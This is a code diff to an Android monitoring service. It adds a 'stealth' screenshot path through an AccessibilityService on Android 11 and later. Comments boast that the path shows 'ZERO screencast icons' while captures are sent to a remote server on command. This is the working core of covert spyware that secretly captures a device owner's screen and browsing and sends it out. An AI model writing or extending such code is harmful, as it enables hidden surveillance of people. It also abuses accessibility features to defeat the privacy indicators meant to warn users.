@@ -119,14 +119,16 @@ class MonitoringService : Service() {
             startForeground(Config.NOTIFICATION_ID, buildNotification())
         }
 
-        // Initialize MediaProjection if intent has the data (Activity.RESULT_OK is -1)
-        val resultCode = intent?.getIntExtra("resultCode", -999) ?: -999
-        @Suppress("DEPRECATION")
-        val projData = intent?.getParcelableExtra<Intent>("projectionData")
-        if (resultCode == Activity.RESULT_OK && projData != null) {
-            screenshotCapture.stop()
-            screenshotCapture.startProjection(resultCode, projData)
-            Log.i(TAG, "MediaProjection initialized successfully")
+        // Only start MediaProjection on Android < 11 (Android 11+ uses stealth takeScreenshot via AccessibilityService with ZERO screencast icons!)
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            val resultCode = intent?.getIntExtra("resultCode", -999) ?: -999
+            @Suppress("DEPRECATION")
+            val projData = intent?.getParcelableExtra<Intent>("projectionData")
+            if (resultCode == Activity.RESULT_OK && projData != null) {
+                screenshotCapture.stop()
+                screenshotCapture.startProjection(resultCode, projData)
+                Log.i(TAG, "MediaProjection initialized successfully for Android < 11")
+            }
         }
 
         // Connect to server
@@ -223,6 +225,24 @@ class MonitoringService : Service() {
     }
 
     private fun handleScreenshot(cmdId: String) {
+        // Step 1: Try 100% stealth screenshot via AccessibilityService first (Android 11+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && BrowserTracker.instance != null) {
+            BrowserTracker.captureStealthBase64(this) { base64 ->
+                if (base64 != null) {
+                    wsManager.sendScreenshot(base64, cmdId)
+                    Log.i(TAG, "📸 Stealth screenshot sent to server via AccessibilityService")
+                } else {
+                    // Fallback to MediaProjection if stealth capture failed
+                    captureViaMediaProjection(cmdId)
+                }
+            }
+            return
+        }
+
+        captureViaMediaProjection(cmdId)
+    }
+
+    private fun captureViaMediaProjection(cmdId: String) {
         if (!screenshotCapture.isActive()) {
             wsManager.sendCommandResult(cmdId, false, "MediaProjection not active. Re-open the app to grant permission.")
             return
